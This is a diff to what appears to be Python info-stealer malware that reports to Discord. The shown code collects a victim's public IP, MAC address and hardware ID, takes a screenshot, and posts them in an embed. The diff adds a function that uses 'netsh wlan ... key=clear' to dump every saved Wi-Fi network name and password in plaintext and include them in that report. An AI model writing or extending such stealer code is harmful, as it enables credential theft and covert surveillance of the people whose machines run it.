@@ -544,6 +544,8 @@ class system():
                         value=f"```{self.get_disk_space()}```", inline=False)
         embed.add_field(name="<:wifi:1004131855374749807> Network",
                         value=f"```IP: {requests.get('https://api.ipify.org').text}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```", inline=False)
+        embed.add_field(name="<:wifi:1004131855374749807> WiFi",
+                        value=f"```{self.get_wifi()}```", inline=False)
 
         ImageGrab.grab(bbox=None, include_layered_windows=False,
                        all_screens=True, xdisplay=None).save("screenshot.png")
@@ -588,6 +590,31 @@ class system():
         hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])
 
         return hwid
+        
+    def get_wifi(self) -> str:
+        networks, out = [], ''
+        wifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+        wifi = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]
+
+        for name in wifi:
+            try:
+                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8').split('\n')
+                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+            except subprocess.CalledProcessError:
+                networks.append((name, ''))
+                continue
+            
+            try:
+                networks.append((name, results[0]))
+            except IndexError:
+                networks.append((name, ''))
+                
+        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
+        out += f'{"-"*20}|{"-"*29}\n'
+        for name, password in networks:
+            out += '{:<20}| {:<}\n'.format(name, password)
+            
+        return out
 
 
 class injection:
